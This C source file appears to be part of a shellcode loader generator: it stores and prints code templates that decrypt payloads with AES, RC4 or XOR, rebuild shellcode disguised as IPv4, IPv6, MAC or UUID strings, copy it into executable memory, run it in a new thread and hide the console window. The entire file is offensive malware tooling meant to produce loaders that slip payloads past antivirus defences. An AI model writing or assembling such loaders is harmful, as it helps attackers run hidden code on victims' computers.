#include <Windows.h>
#include <stdio.h>


#include "Common.h"

char _Main_Open[] =
"// Thread function to execute the shellcode\n"
"DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {\n"
"	PBYTE shellcode = (PBYTE)lpParam;\n"
"	// Execute the shellcode\n"
"	void (*execShellcode)() = (void(*)())shellcode;\n"
"	execShellcode();  // Execute the shellcode\n"
"	return 0;\n"
"}\n\n"
"int main() {\n"
;

char _Main_Close[] =
"PBYTE execMem = (PBYTE)VirtualAlloc(NULL, sDSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n"
"if (execMem == NULL) {\n"
"	printf(\"[!] VirtualAlloc failed with error : % lu\", GetLastError());\n"
	"HeapFree(GetProcessHeap(), 0, cipherText);\n"
	"return -1;\n"
"}\n"

"// Copy the decrypted shellcode into the allocated memory\n"
"memcpy(execMem, cipherText, sDSize);\n"

"// Create a new thread to execute the shellcode\n"
"HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, execMem, 0, NULL);\n"
"if (hThread == NULL) {\n"
"	printf(\"[!] CreateThread failed with error : % lu\", GetLastError());\n"
"	VirtualFree(execMem, 0, MEM_RELEASE);\n"
"	HeapFree(GetProcessHeap(), 0, cipherText);\n"
"	return -1;\n"
"}\n"

"FreeConsole();\n"

"// Wait for the thread to complete\n"
"WaitForSingleObject(hThread, INFINITE);\n"

"// Cleanup\n"
"CloseHandle(hThread);\n"
"VirtualFree(execMem, 0, MEM_RELEASE);\n"
"HeapFree(GetProcessHeap(), 0, cipherText);\n"

"return 0; \n"
"}"
;

char _GeneralHeader[] =
"#include <Windows.h>\n"
"#include <stdio.h>\n"
;

char _AesDecryption_preMain[] =
"#include \"aes.h\"\n"
"// the Visual Studio project should include:\n"
"// aes.h\n"
"// aes.c\n"
;



char _Size_Ini[] =
"SIZE_T sDSize = sizeof(cipherText);\n"
;

char _AesDecryption_Main[] =
"// Struct needed for tiny-AES library\n"
"struct AES_ctx ctx;\n"
"// Initilizing the Tiny-Aes Library\n"
"AES_init_ctx_iv(&ctx, AesKey, AesIv);\n"
"// Decrypting\n"
"AES_CBC_decrypt_buffer(&ctx, cipherText, sDSize);\n"
;




char _Rc4Decryption_preMain[] =
"// this is what SystemFunction032 function take as a parameter\n"
"typedef struct\n"
"{\n"
"DWORD	Length; \n"
"DWORD	MaximumLength; \n"
"PVOID	Buffer; \n"
"\n"
"} USTRING; \n\n"
"// defining how does the function look - more on this structure in the api hashing part\n"
"typedef NTSTATUS(NTAPI* fnSystemFunction032)(\n"
"	struct USTRING* Img, \n"
"	struct USTRING* Key\n"
"); \n\n"
"BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
"	\n"
"	// the return of SystemFunction032\n"
"	NTSTATUS	STATUS = NULL; \n"
"	\n"
"	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt\n"
"	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize }, \n"
"			Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize }; \n"
"	\n"
"	\n"
"	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,\n"
"	// and using its return as the hModule parameter in GetProcAddress\n"
"	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\"); \n"
"	\n"
"	// if SystemFunction032 calls failed it will return non zero value\n"
"	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {\n"
"		printf(\"[!] SystemFunction032 FAILED With Error : 0x%0.8X\\n\", STATUS); \n"
"		return FALSE; \n"
"	}\n\n"
"	return TRUE; \n"
"}\n";

char _Rc4Decryption_Main[] =
"// Decryption\n"
"if (!Rc4EncryptionViSystemFunc032(Rc4Key, cipherText, sizeof(Rc4Key), sDSize)) {\n"
"	// Failed\n"
"	return -1;\n"
"}\n"
;




char _XorDecryption_preMain[] =
"BOOL XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {\n"
"	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {\n"
"		// If the key is exhausted, start again\n"
"		if (j >= sKeySize) {\n"
"			j = 0;\n"
"		}\n"
"		pShellcode[i] = pShellcode[i] ^ bKey[j];\n"
"	}\n"
"	return TRUE;"
"}\n"
;



char _XorDecryption_Main[] =
"// Decryption\n"
"if (!XorByInputKey(cipherText ,sDSize, XorKey, sizeof(XorKey))) {\n"
"	// Failed\n"
"	return -1;\n"
"}\n"
;


char _Ipv4Deobfuscation_preMain[] =
"typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(\n"
"	PCSTR			S, \n"
"	BOOLEAN			Strict, \n"
"	PCSTR*			Terminator, \n"
"	PVOID			Addr\n"
"); \n\n\n"
"BOOL Ipv4Deobfuscation(IN CHAR * Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		// getting RtlIpv4StringToAddressA address from ntdll.dll\n"
"		fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT(\"NTDLL\")), \"RtlIpv4StringToAddressA\"); \n"
"		if (pRtlIpv4StringToAddressA == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 4 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 4; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in Ipv4Array\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// Ipv4Array[i] is a single ipv4 address from the array Ipv4Array\n"
"			if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {\n"
"				// if failed ...\n"
"				printf(\"[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X\\n\", Ipv4Array[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 4); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n";

char _Ipv4Deobfuscation_Main[] =
"PBYTE cipherText = NULL;\n"
"SIZE_T	sDSize = NULL;\n"
"if (!Ipv4Deobfuscation(Ipv4Array, NumberOfElements, &cipherText, &sDSize)){\n"
"	return -1;\n"
"}\n"
;




char _Ipv6Deobfuscation_preMain[] =
"typedef NTSTATUS (NTAPI* fnRtlIpv6StringToAddressA)(\n"
"	PCSTR			S, \n"
"	PCSTR*			Terminator, \n"
"	PVOID			Addr\n"
"); \n\n\n"
"BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		// getting RtlIpv6StringToAddressA  address from ntdll.dll\n"
"		fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT(\"NTDLL\")), \"RtlIpv6StringToAddressA\"); \n"
"		if (pRtlIpv6StringToAddressA == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 16 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 16; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in Ipv6Array\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// Ipv6Array[i] is a single ipv6 address from the array Ipv6Array\n"
"			if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {\n"
"				// if failed ...\n"
"				printf(\"[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\\n\", Ipv6Array[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 16); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n";

char _Ipv6Deobfuscation_Main[] =
"PBYTE cipherText = NULL;\n"
"SIZE_T	sDSize = NULL;\n"
"if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &cipherText, &sDSize)){\n"
"	return -1;\n"
"}\n"
;

char _MacDeobfuscation_preMain[] =
"typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(\n"
"	PCSTR			S, \n"
"	PCSTR*			Terminator, \n"
"	PVOID			Addr\n"
"); \n\n\n"
"BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		// getting fnRtlEthernetStringToAddressA  address from ntdll.dll\n"
"		fnRtlEthernetStringToAddressA  pRtlEthernetStringToAddressA  = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT(\"NTDLL\")), \"RtlEthernetStringToAddressA\"); \n"
"		if (pRtlEthernetStringToAddressA  == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 6 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 6; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in MacArray\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// MacArray[i] is a single mac address from the array MacArray\n"
"			if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {\n"
"				// if failed ...\n"
"				printf(\"[!] RtlEthernetStringToAddressA  Failed At [%s] With Error 0x%0.8X\\n\", MacArray[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 6); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n";

char _MacDeobfuscation_Main[] =
"PBYTE	cipherText	= NULL;\n"
"SIZE_T	sDSize = NULL;\n"
"if (!MacDeobfuscation(MacArray, NumberOfElements, &cipherText, &sDSize)){\n"
"	return -1;\n"
"}\n";


char _UuidDeobfuscation_preMain[] =
"typedef RPC_STATUS (WINAPI* fnUuidFromStringA)(\n"
"	RPC_CSTR	StringUuid,\n"
"	UUID*		Uuid\n"
"); \n\n\n"
"BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {\n\n"
"		PBYTE		pBuffer		= NULL, \n"
"				TmpBuffer	= NULL; \n\n"
"		SIZE_T		sBuffSize	= NULL; \n\n"
"		PCSTR		Terminator	= NULL; \n\n"
"		NTSTATUS	STATUS		= NULL; \n\n"
"		// getting UuidFromStringA   address from Rpcrt4.dll\n"
"		fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT(\"RPCRT4\")), \"UuidFromStringA\"); \n"
"		if (pUuidFromStringA == NULL) {	\n"
"				printf(\"[!] GetProcAddress Failed With Error : %d \\n\", GetLastError()); \n"
"				return FALSE; \n"
"		}\n"
"		// getting the real size of the shellcode (number of elements * 16 => original shellcode size)\n"
"		sBuffSize = NmbrOfElements * 16; \n"
"		// allocating mem, that will hold the deobfuscated shellcode\n"
"		pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize); \n"
"		if (pBuffer == NULL) {\n"
"			printf(\"[!] HeapAlloc Failed With Error : %d \\n\", GetLastError()); \n"
"			return FALSE; \n"
"		}\n"
"		// setting TmpBuffer to be equal to pBuffer\n"
"		TmpBuffer = pBuffer; \n\n\n"
"		// loop through all the addresses saved in Ipv6Array\n"
"		for (int i = 0; i < NmbrOfElements; i++) {\n"
"			// UuidArray[i] is a single UUid address from the array UuidArray\n"
"			if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {\n"
"				// if failed ...\n"
"				printf(\"[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\\n\", UuidArray[i], STATUS); \n"
"				return FALSE; \n"
"			}\n\n"
"			// tmp buffer will be used to point to where to write next (in the newly allocated memory)\n"
"			TmpBuffer = (PBYTE)(TmpBuffer + 16); \n"
"		}\n\n"
"		*ppDAddress = pBuffer; \n"
"		*pDSize = sBuffSize; \n"
"		return TRUE; \n"
"}\n\n";

char _UuidDeobfuscation_Main[] =
"PBYTE	cipherText	= NULL;\n"
"SIZE_T	sDSize = NULL;\n"
"	if (!UuidDeobfuscation(UuidArray, NumberOfElements, &cipherText, &sDSize)){\n"
"	return -1;\n"
"}\n"
;


VOID PrintDecodeFunctionality(IN INT TYPE) {
	if (TYPE == 0) {
		printf("[!] Missing Input Type (StringFunctions:362)\n");
		return;
	}

	switch (TYPE) {
	case HEADER:
		printf("%s\n", _GeneralHeader);
		break;
	case MAIN_OPEN:
		printf("%s\n", _Main_Open);
		break;

	case MAIN_CLOSE:
		printf("%s\n", _Main_Close);
		break;

	case IPV4FUSCATION_PREMAIN:
		printf("%s\n", _Ipv4Deobfuscation_preMain);
		break;

	case IPV4FUSCATION_MAIN:
		printf("%s\n", _Ipv4Deobfuscation_Main);
		break;

	case IPV6FUSCATION_PREMAIN:
		printf("%s\n", _Ipv6Deobfuscation_preMain);
		break;

	case IPV6FUSCATION_MAIN:
		printf("%s\n", _Ipv6Deobfuscation_Main);
		break;

	case MACFUSCATION_PREMAIN:
		printf("%s\n", _MacDeobfuscation_preMain);
		break;

	case MACFUSCATION_MAIN:
		printf("%s\n", _MacDeobfuscation_Main);
		break;

	case UUIDFUSCATION_PREMAIN:
		printf("%s\n", _UuidDeobfuscation_preMain);
		break;

	case UUIDFUSCATION_MAIN:
		printf("%s\n", _UuidDeobfuscation_Main);
		break;

	case AESENCRYPTION_PREMAIN:
		printf("%s\n", _AesDecryption_preMain);
		break;
	case AESENCRYPTION_MAIN:
		printf("%s\n", _AesDecryption_Main);
		break;
	case SIZE_INI:
		printf("%s\n", _Size_Ini);
		break;

	case RC4ENCRYPTION_PREMAIN:
		printf("%s\n", _Rc4Decryption_preMain);
		break;
	case RC4ENCRYPTION_MAIN:
		printf("%s\n", _Rc4Decryption_Main);
		break;
	case XORENCRYPTION_PREMAIN:
		printf("%s\n", _XorDecryption_preMain);
		break;
	case XORENCRYPTION_MAIN:
		printf("%s\n", _XorDecryption_Main);
		break;

	default:
		printf("[!] Unsupported Type Entered : 0x%0.8X \n", TYPE);
		break;
	}


}